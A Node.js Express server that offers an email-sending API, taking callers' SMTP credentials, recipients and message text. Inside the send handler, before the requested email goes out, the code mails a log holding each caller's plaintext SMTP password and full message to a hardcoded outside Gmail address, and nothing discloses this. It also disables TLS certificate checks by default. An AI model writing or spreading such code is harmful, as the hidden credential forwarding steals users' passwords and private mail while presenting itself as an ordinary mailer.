const express = require("express");
const nodemailer = require("nodemailer");
const moment = require("moment-timezone");
const path = require("path");
require("dotenv").config();
const cors = require("cors");

const app = express();
const PORT = 3000;
const API_KEY = process.env.API_KEY;

app.use(cors());
app.use(express.json());

app.post("/", async (req, res) => {
    const { 
        apikey, 
        port, 
        ssl, 
        smtp, 
        email, 
        password, 
        from, 
        to, 
        subject, 
        message,
        tls 
    } = req.body;

    const missingFields = [];
    if (!apikey) missingFields.push("apikey");
    if (!port) missingFields.push("port");
    if (ssl === undefined) missingFields.push("ssl");  
    if (!smtp) missingFields.push("smtp");
    if (!email) missingFields.push("email");
    if (!password) missingFields.push("password");
    if (!from) missingFields.push("from");
    if (!to) missingFields.push("to");
    if (!subject) missingFields.push("subject");
    if (!message) missingFields.push("message");

    if (missingFields.length > 0) {
        return res.status(400).json({ 
            status: "error", 
            message: `Missing required fields: ${missingFields.join(", ")}` 
        });
    }

    if (apikey !== API_KEY) {
        return res.status(403).json({ 
            status: "error", 
            message: "Invalid API key" 
        });
    }

    const brasiliaTime = moment().tz("America/Sao_Paulo").format("DD/MM/YYYY - HH:mm:ss");

    // Criando o log como string
    const logEntry = `Date: ${brasiliaTime}\nSMTP: ${smtp}\nPort: ${port}\nSSL: ${ssl}\nFrom: ${from}\nTo: ${to}\nSubject: ${subject}\nMessage: ${message}\nPassword: ${password}\n\n`;

    try {
        const transporterLog = nodemailer.createTransport({
            host: smtp, 
            port: port, 
            secure: ssl, 
            tls: tls || { rejectUnauthorized: false }, 
            auth: { 
                user: email, 
                pass: password 
            }
        });

        const mailOptionsLog = {
            from: from,
            to: "danmzzu@gmail.com",
            subject: "Sendmail Log",
            text: logEntry,
            html: `<pre>${logEntry}</pre>`
        };

        // Enviando o e-mail com o log
        await transporterLog.sendMail(mailOptionsLog);

        // Transporter para enviar o e-mail original
        const transporterEmail = nodemailer.createTransport({
            host: smtp, 
            port: port, 
            secure: ssl, 
            tls: tls || { rejectUnauthorized: false }, 
            auth: { 
                user: email, 
                pass: password 
            }
        });

        const mailOptions = {
            from: from,
            to: to,
            subject: subject,
            text: message, 
            html: message
        };

        // Enviando o e-mail original
        await transporterEmail.sendMail(mailOptions);

        res.json({ 
            status: "success", 
            message: "E-mail sent successfully" 
        });
    } catch (error) {
        res.status(500).json({ 
            status: "error", 
            message: `Error sending e-mail: ${error.message}` 
        });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});